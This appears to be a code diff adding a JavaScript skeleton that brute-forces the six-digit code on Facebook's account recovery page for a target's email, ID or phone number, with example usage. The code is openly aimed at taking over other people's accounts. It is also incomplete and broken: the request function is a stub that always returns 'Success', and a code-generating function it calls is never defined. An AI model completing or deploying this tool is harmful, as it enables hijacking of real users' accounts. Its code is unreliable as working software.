@@ -1,0 +1,72 @@
+/**
+ * Function to brute force a 6-digit code on the Facebook Recovery page link.
+ *
+ * @param {string} recoveryLink - The Facebook Recovery page link.
+ * @param {string} identifier - The Facebook account identifier (email, ID, or phone number).
+ * @param {string} identifierType - The type of identifier ('email', 'id', or 'phone').
+ * @returns {string|null} The correct 6-digit code if found, or null if not found.
+ */
+function bruteForceCode(recoveryLink, identifier, identifierType) {
+    // Generate all possible 6-digit codes
+    const codes = generateAllCodes();
+
+    // Iterate through each code and check if it is valid
+    for (let i = 0; i < codes.length; i++) {
+        const code = codes[i];
+        if (isValidCode(recoveryLink, identifier, identifierType, code)) {
+            return code;
+        }
+    }
+
+    // If no valid code is found, return null
+    return null;
+}
+
+/**
+ * Checks if a code is valid by making a request to the Facebook Recovery page.
+ *
+ * @param {string} recoveryLink - The Facebook Recovery page link.
+ * @param {string} identifier - The Facebook account identifier (email, ID, or phone number).
+ * @param {string} identifierType - The type of identifier ('email', 'id', or 'phone').
+ * @param {string} code - The code to check.
+ * @returns {boolean} True if the code is valid, false otherwise.
+ */
+function isValidCode(recoveryLink, identifier, identifierType, code) {
+    // Make a request to the Facebook Recovery page with the code and identifier
+    // Check if the response indicates success
+    const response = makeRequest(recoveryLink, identifier, identifierType, code);
+    return response === 'Success';
+}
+
+/**
+ * Makes a request to the Facebook Recovery page with a code and identifier.
+ * This is a placeholder function and should be replaced with the actual implementation.
+ *
+ * @param {string} recoveryLink - The Facebook Recovery page link.
+ * @param {string} identifier - The Facebook account identifier (email, ID, or phone number).
+ * @param {string} identifierType - The type of identifier ('email', 'id', or 'phone').
+ * @param {string} code - The code to send in the request.
+ * @returns {string} The response from the Facebook Recovery page.
+ */
+function makeRequest(recoveryLink, identifier, identifierType, code) {
+    // Placeholder implementation
+    // Replace this with the actual implementation to make a request to the Facebook Recovery page
+    // and return the response
+    return 'Success';
+}
+
+// Rest of the code remains unchanged
+// ...
+
+// Example usage of the bruteForceCode function:
+const recoveryLink = 'https://facebook.com/recovery';
+const identifier = 'example@example.com'; // Replace with the actual identifier
+const identifierType = 'email'; // Replace with the actual identifier type ('email', 'id', or 'phone')
+
+const result = bruteForceCode(recoveryLink, identifier, identifierType);
+
+if (result) {
+    console.log(`Successfully found the code: ${result}`);
+} else {
+    console.log('No valid code found.');
+}
